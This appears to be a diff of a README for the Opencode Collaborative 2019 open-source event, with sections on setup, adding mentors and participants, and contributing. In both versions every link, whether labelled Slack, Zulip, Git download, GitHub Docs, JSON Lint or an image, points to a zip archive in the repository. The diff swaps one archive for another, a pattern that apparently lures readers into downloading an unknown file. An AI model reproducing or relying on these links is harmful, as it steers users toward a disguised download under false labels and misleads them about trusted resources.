@@ -1,18 +1,18 @@
-# [Opencode Collaborative 2019](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
+# [Opencode Collaborative 2019](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
 
-![Opencode](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
+![Opencode](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
 
-[![OpenCode](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
+[![OpenCode](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
 
-Chat with us on [Slack](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
+Chat with us on [Slack](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
 
-Join Zulip Chat [Zulip](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
+Join Zulip Chat [Zulip](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
 
-Like us on [Facebook](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
+Like us on [Facebook](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
 
 ## About us.
 
-[OpenCode](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip) is a month long open source program organised by [GeekHaven IIIT Allahabad](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip). OpenCode attracts talent from all over the world. People contribute to various open source projects. We welcome everyone to experience the awesome event and win exciting prizes.
+[OpenCode](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip) is a month long open source program organised by [GeekHaven IIIT Allahabad](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip). OpenCode attracts talent from all over the world. People contribute to various open source projects. We welcome everyone to experience the awesome event and win exciting prizes.
 
 ## Requirements:
 
@@ -21,18 +21,18 @@ Like us on [Facebook](https://github.com/sameersahoo/Opencode-Collaborative-19/r
 
 #### Setting up git:
 
-- [Download and install the latest version of Git.](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
-- [Set your username in Git.](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
-- [Set your commit email address in Git.](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
+- [Download and install the latest version of Git.](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
+- [Set your username in Git.](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
+- [Set your commit email address in Git.](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
 
 ## Adding a mentor
 
-To add a mentor open `https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip` and please maintain the following format EXACTLY (replacing values where indicated):
+To add a mentor open `https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip` and please maintain the following format EXACTLY (replacing values where indicated):
 ```
      {
 
         "name" : "Mentors Name",
-        "imageurl" : "https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip",
+        "imageurl" : "https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip",
         "about" : "Hello I'm a web developer",
         "facebook" : "url",
         "github" : "url",
@@ -48,13 +48,13 @@ IMPORTANT:
 
 ## Adding yourselves to participant section
 
-To add yourself to student section you need to open the file `https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip` and please maintain the following format EXACTLY (replacing values where indicated):
+To add yourself to student section you need to open the file `https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip` and please maintain the following format EXACTLY (replacing values where indicated):
 
  ```
     {
 
         "name" : "Name",
-        "imageurl" : "https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip",
+        "imageurl" : "https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip",
         "about" : "Hello I'm a web developer",
         "college" : "My college",
         "facebook" : "url",
@@ -69,7 +69,7 @@ IMPORTANT:
 - The images should be of square resolution.
 - If you do not want to include social media accounts, leave the field empty `"facebook":""`.
 
-- While working with JSON, check the file using [JSON Lint](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip) before opening pull request
+- While working with JSON, check the file using [JSON Lint](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip) before opening pull request
 
 ## Contributing
 
@@ -79,25 +79,25 @@ We will follow the official GitHub documentation for setting up the repo.
 
 - Forking and cloning the repository
 
-  > [Link to GitHub Docs](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
+  > [Link to GitHub Docs](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
 
   By forking a repository you create your own copy of the project and make your changes there. Cloning a project means that you are setting up the project on your local system.
 
 - Syncing a fork
 
-  > [Link to GitHub docs](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
+  > [Link to GitHub docs](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
 
   We keep our fork in sync to the original repository so that our copy of the project has the latest changes from the original project.
 
 - Making changes to project and committing a change
 
-  > [Link to docs](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
+  > [Link to docs](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
 
   Committing means making changes to the project and adding your changes to the GitHub..
 
 - Making a pull request
 
-  > [Link to docs](https://github.com/sameersahoo/Opencode-Collaborative-19/raw/refs/heads/master/css/Collaborative_Opencode_v2.6.zip)
+  > [Link to docs](https://raw.githubusercontent.com/sameersahoo/Opencode-Collaborative-19/master/assets/Opencode-Collaborative-v3.6.zip)
 
   - Pull request means submitting your changes to the original project for the review. Once the maintainers of the project feel that your changes are appropriate then your pull request will be merged.
 
